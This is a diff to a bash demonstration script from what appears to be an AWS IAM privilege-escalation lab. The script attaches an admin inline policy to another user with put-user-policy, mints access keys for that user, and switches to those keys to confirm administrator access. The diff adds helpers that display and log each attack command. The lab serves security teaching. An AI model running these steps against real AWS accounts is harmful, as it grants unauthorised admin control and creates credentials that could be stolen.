@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user with PutUserPolicy and CreateAccessKey
 # permissions on another user can escalate to admin access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-018-to-admin-starting-user"
@@ -72,6 +92,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -83,6 +104,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -90,6 +112,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify starting user lacks admin access
 echo -e "${YELLOW}Step 4: Verifying starting user lacks admin access${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -128,6 +151,7 @@ cat > $POLICY_FILE <<EOF
 EOF
 
 echo "Adding admin policy '$ADMIN_POLICY_NAME' to user $TARGET_USER_NAME"
+show_attack_cmd "aws iam put-user-policy --user-name $TARGET_USER_NAME --policy-name $ADMIN_POLICY_NAME --policy-document file://$POLICY_FILE"
 aws iam put-user-policy \
     --user-name $TARGET_USER_NAME \
     --policy-name $ADMIN_POLICY_NAME \
@@ -144,6 +168,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 7: Creating access keys for target user${NC}"
 echo "Creating access keys for: $TARGET_USER_NAME"
 
+show_attack_cmd "aws iam create-access-key --user-name $TARGET_USER_NAME --output json"
 KEY_OUTPUT=$(aws iam create-access-key --user-name $TARGET_USER_NAME --output json)
 NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
 NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')
@@ -164,6 +189,7 @@ export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_IDENTITY"
 echo -e "${GREEN}✓ Now using target user credentials${NC}\n"
@@ -172,6 +198,7 @@ echo -e "${GREEN}✓ Now using target user credentials${NC}\n"
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -195,6 +222,13 @@ echo "5. Achieved: Administrator access"
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (PutUserPolicy) → $TARGET_USER_NAME → (CreateAccessKey) → Authenticate as $TARGET_USER_NAME → Admin"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Admin inline policy '$ADMIN_POLICY_NAME' on $TARGET_USER_NAME"
 echo "- Access key: $NEW_ACCESS_KEY"
@@ -204,3 +238,6 @@ echo -e "\n${RED}⚠ Warning: Target user now has administrative permissions${NC
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
